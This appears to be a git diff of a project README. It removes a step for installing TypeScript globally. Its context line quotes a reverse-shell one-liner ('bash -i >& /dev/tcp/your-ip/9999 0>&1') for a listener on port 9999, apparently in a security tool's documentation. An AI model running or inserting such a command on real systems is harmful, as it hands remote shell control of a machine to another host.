@@ -35,13 +35,6 @@ receive reverse shells on port 9999 (`bash -i >& /dev/tcp/your-ip/9999 0>&1`).
 
 ## development
 
-Do this before building docker.
-
-```
-# install typescript globally
-npm install -g typescript
-```
-
 ```
 # install local node_modules dependencies
 make backend-environment
